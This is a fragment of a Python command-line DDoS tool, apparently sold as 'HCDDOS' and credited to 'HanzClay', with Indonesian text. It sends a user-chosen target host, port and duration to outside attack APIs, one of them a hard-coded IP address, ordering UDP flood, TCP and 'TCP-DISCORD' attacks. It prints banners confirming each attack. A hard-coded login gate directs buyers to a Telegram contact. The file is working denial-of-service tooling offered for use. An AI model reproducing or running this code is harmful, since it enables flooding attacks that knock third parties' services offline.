				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=UDP-FLOOD').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mOVH \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "udp" or sinput == "UDP":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=GUDP-FLOOD').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mUDP \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "str" or sinput == "STR":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				Hanz = requests.get(f'https://api.ngocphong.space/api?key=5682628749&host={url}&time={time}&port={port}&method=TCP-DISCORD').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 1 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mSTR \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")

			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "xcf" or sinput == "XCF":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				#Hanz = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=UDP').json()
				xin = requests.get(f'http://157.245.54.106:3000/api/attack?key=ngocphong&url={url}&port={port}&time={time}&method=TCP').json()
				os.system ("clear")
				print(f"""
  _    _          _   _ ___________ _           __     __
 | |  | |   /\   | \ | |___  / ____| |        /\\ \   / /
 | |__| |  /  \  |  \| |  / / |    | |       /  \\ \_/ / 
 |  __  | / /\ \ | . ` | / /| |    | |      / /\ \\   /  
 | |  | |/ ____ \| |\  |/ /_| |____| |____ / ____ \| |   
 |_|  |_/_/    \_\_| \_/_____\_____|______/_/    \_\_|   
                                                         
                                                         
\033[0;33m ⚠️[INFO] {Hanz}!⚠️
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   TARGET   : \033[0;33m[ \033[0;94m{url} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m {time} \033[0;33m]
\033[0;94m                INFO     : \033[0;33m[\033[32m {srv} Server / 2 cons 👑 \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mXCF \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mHanzClay \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝


NOTE:

Ketik " STOP " Untuk memberhentikan serangan!

⚠️HATI HATI JIKA TERMINAL MENGALAMI CRASH MAKA LOGIN KEMBALI KE CNC
LALU KETIK STOP AGAR SERANGAN DDOS DAPAT BERHENTI❗❗❗

\033[0;33mSpecial method power C2 Api by HanzClay
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = "Hanzclay"
    passwd = "VVIP"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO HCDDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""☠️ \033[1;31;40mPW SALAH BELI DULU !!!🚫\nTELEGRAM: @Kucing_super""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO HCDDOS TOOLS""")
        time.sleep(0.3)
    HC()
    main()
    

login()